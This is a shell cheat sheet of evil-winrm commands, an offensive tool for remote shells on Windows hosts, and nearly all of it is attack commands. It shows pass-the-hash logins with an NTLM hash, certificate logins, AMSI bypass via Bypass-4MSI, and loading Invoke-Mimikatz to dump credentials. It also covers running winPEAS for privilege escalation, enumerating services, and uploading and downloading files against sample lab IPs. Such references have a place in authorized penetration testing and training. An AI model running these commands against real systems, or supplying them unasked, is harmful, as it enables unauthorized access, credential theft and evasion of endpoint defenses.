
```shell
#install - You must have Ruby installed to use gem
gem install evil-winrm

#example
evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'

#enable SSL
evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s

#Login with NTLM Hash -Pass The Hash Attack
evil-winrm -i 192.168.1.19 -u administrator -H 32196B56FFE6F45E294117B91A83BF38

#Login with the key using Evil-winrm
evil-winrm -i 10.129.227.105 -c certificate.pem -k priv-key.pem -S

#Load Powershell Script - example with mimikatz.ps1
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz

#Store logs with Evil-winrm
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -l

#Disable Remote Path Completion
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -N

#Disable Coloured Interface
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -n

#Run Executables File
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -e /opt/privsc
Bypass-4MSI
menu
Invoke-Binary /opt/privsc/winPEASx64.exe

#Service Enumeration with Evil-winrm
menu
services

#File Transfer with Evil-winrm
upload /root/notes.txt .
download notes.txt /root/raj/notes.txt

#Use Evil-winrm From Docker
docker run --rm -ti --name evil-winrm  oscarakaelvis/evil-winrm -i 192.168.1.105 -u Administrator -p 'Ignite@987'

```
